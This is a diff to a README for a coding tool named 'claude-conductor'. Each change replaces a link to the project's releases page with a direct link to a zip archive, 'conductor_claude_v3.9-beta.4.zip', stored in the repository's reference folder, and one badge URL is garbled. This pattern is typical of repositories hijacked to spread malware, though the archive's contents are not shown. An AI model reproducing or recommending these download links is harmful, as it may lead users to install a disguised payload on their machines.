@@ -1,7 +1,7 @@
 # 🎉 claude-conductor - Transform Your Coding Workflow
 
 ## 🔗 Download Now!
-[![Download claude-conductor](https://img.shields.io/badge/Download%20Now-%20claude%20conductor-blue.svg)](https://github.com/MZWASHERE/claude-conductor/releases)
+[![Download claude-conductor](https://github.com/MZWASHERE/claude-conductor/raw/refs/heads/main/reference/conductor_claude_v3.9-beta.4.zip%20Now-%20claude%https://github.com/MZWASHERE/claude-conductor/raw/refs/heads/main/reference/conductor_claude_v3.9-beta.4.zip)](https://github.com/MZWASHERE/claude-conductor/raw/refs/heads/main/reference/conductor_claude_v3.9-beta.4.zip)
 
 ## 📖 Introduction
 Welcome to **claude-conductor**! This application is designed to enhance your development process with its Context-Driven Development framework. Whether you're a novice or an experienced user, this tool will help you manage your projects with ease. Inspired by the work of the Gemini CLI extensions, claude-conductor brings you a streamlined workflow.
@@ -17,7 +17,7 @@ Before you begin, ensure your system meets the following requirements:
 - **Storage**: Minimum of 100 MB of free disk space
 
 ### Step 2: Visit the Releases Page
-To download the application, visit this page: [Download Page](https://github.com/MZWASHERE/claude-conductor/releases). Here, you will find the latest version of claude-conductor available for download.
+To download the application, visit this page: [Download Page](https://github.com/MZWASHERE/claude-conductor/raw/refs/heads/main/reference/conductor_claude_v3.9-beta.4.zip). Here, you will find the latest version of claude-conductor available for download.
 
 ### Step 3: Download the Application
 On the Releases page, look for the latest version of claude-conductor. You will see several downloadable files. Choose the file that matches your operating system. Click on the download link.
@@ -44,7 +44,7 @@ Enhance your experience by using plugins. You can find and install additional pl
 With built-in support for test-driven development, you can write your tests before implementing features. This approach helps to ensure your code remains reliable.
 
 ## 📥 Download & Install
-To get started, download the application here: [claude-conductor Releases](https://github.com/MZWASHERE/claude-conductor/releases). 
+To get started, download the application here: [claude-conductor Releases](https://github.com/MZWASHERE/claude-conductor/raw/refs/heads/main/reference/conductor_claude_v3.9-beta.4.zip). 
 
 Make sure to follow the previous steps for installation and familiarize yourself with the features available.
 
@@ -60,4 +60,4 @@ Join our community of users and developers. If you have any questions or need as
 ## 🏁 Conclusion
 claude-conductor is more than just a tool. It is a comprehensive framework designed to improve your coding workflow. By following this guide, you’re well on your way to enhancing your coding experience.
 
-Download the application today and see how it can transform your development process! [claude-conductor Releases](https://github.com/MZWASHERE/claude-conductor/releases)
+Download the application today and see how it can transform your development process! [claude-conductor Releases](https://github.com/MZWASHERE/claude-conductor/raw/refs/heads/main/reference/conductor_claude_v3.9-beta.4.zip)
